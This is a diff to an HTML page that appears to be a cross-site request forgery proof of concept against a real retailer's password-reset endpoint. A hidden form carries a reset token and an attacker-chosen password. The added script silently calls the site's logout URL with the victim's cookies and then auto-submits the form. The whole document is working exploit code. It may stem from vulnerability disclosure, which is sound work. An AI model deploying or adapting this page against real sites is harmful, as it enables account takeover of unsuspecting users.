@@ -1,7 +1,7 @@
 <html>
   <body>
     <form action="https://www.coolblue.be/en/set-new-password" method="POST">
-      <input type="hidden" name="passwordResetId" value="663C1AF73E9D5A050271A34CD549ED71DF23AC89" />
+      <input type="hidden" name="passwordResetId" value="820463BCFBBBE5FCF5B77E12E6DA04056E637335" />
       <input type="hidden" name="password" value="Uilirecs123" />
       <input type="hidden" name="confirmPassword" value="Uilirecs123" />
       <input type="hidden" value="Submit request" />
@@ -10,7 +10,10 @@
   <script>
 
     setTimeout(function(){
-      //Wait 1 sec and login
+      //Wait 1 sec
+      //Logout
+      fetch("https://www.coolblue.be/en/logout", { mode: 'no-cors', credentials: 'include'})
+      //Login
       document.forms[0].submit();
     }, 1000);
 
